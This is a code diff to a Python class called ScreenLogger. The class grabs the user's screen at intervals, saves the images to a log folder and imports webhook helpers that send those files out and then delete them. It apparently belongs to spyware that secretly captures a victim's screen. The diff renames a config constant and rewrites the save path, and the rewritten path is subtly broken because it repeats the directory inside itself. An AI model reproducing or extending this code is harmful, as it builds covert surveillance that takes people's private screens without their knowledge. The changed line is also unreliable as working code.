@@ -2,7 +2,7 @@ import PIL.ImageGrab
 import time
 import os
 
-from config import LOGS_DIRECTORY, SCREENSHOT_INTERVAL_SEC, SCREENSHOTS_BEFORE_SEND
+from config import LOG_DIRECTORY_PATH, SCREENSHOT_INTERVAL_SEC, SCREENSHOTS_BEFORE_SEND
 from utils.logging_utils import log_error, log_info
 from utils.webhook_utils import send_log_files_in_directory
 from utils.file_utils import clear_files_in_log_directory
@@ -10,7 +10,7 @@ from utils.file_utils import clear_files_in_log_directory
 class ScreenLogger:
     def __init__(self):
         self.logs_directory = "screenshots"
-        self.logs_directory_path = os.path.join(LOGS_DIRECTORY, self.logs_directory)
+        self.logs_directory_path = os.path.join(LOG_DIRECTORY_PATH, self.logs_directory)
         self.interval = SCREENSHOT_INTERVAL_SEC
         self.counter_max = SCREENSHOTS_BEFORE_SEND
         self.counter = 0
@@ -18,8 +18,9 @@ class ScreenLogger:
 
     def log_screen(self):
         screenshot = PIL.ImageGrab.grab()
-        screenshot.save(os.path.join(self.logs_directory, f"{self.counter}.png"))
+        screenshot.save(os.path.join(self.logs_directory_path, f"{self.logs_directory_path}/{self.counter}.png"))
         screenshot.close()
+        log_info(f"Logged screenshot to {os.path.join(self.logs_directory_path, f'{self.counter}.png')}")
         self.increment_and_check_counter()
 
     def increment_and_check_counter(self):
